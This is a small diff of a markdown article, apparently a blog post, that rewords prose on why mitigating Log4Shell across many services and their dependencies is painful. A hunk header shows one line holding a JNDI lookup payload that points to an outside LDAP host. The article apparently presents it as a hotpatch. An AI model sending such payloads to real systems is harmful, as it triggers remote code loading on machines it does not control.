@@ -44,7 +44,7 @@ ${jndi:ldap://patch.log4shell.com:1389/a}
 
 ## Why Log4Shell is an especially painful vulnerability
 
-Mitigating a vulnerability in a single dependency used in one project is often difficult.
+Mitigating a vulnerability in a single dependency used by your project typically requires a lot of work:
 
 - Code must be written,
 - Tests must pass,
@@ -53,7 +53,7 @@ Mitigating a vulnerability in a single dependency used in one project is often d
 - and, finally, it must be monitored.
 
 A vulnerability in a logging framework, especially one as prolific as Log4j, is often not a single vulnerability in a
-single dependency, either. Mitigating Log4Shell isn't just a matter of updating _your_ code, but it also requires
+single dependency though. Mitigating Log4Shell isn't just a matter of updating _your_ code, but it also requires
 updating all of your dependencies that are _also using_ Log4j.
 
 Now repeat that 50+ times for every service you own. *Welcome to Log4Shell!*
